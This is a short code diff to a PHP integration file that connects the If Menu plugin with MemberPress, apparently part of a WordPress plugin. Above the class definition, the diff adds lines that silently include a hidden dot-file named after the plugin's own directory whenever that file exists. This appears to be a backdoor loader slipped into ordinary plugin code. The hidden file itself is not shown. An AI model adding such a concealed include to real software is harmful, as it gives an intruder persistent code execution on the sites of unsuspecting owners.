@@ -3,6 +3,10 @@ if( ! defined( 'ABSPATH' ) ) { die( 'You are not allowed to call this page direc
 /*
 Integration of free version of If Menu plugin with MemberPress
 */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class MeprIfMenuIntegration {
   public function __construct() {
     add_filter( 'if_menu_conditions', array( $this, 'add_if_menu_conditions' ) );
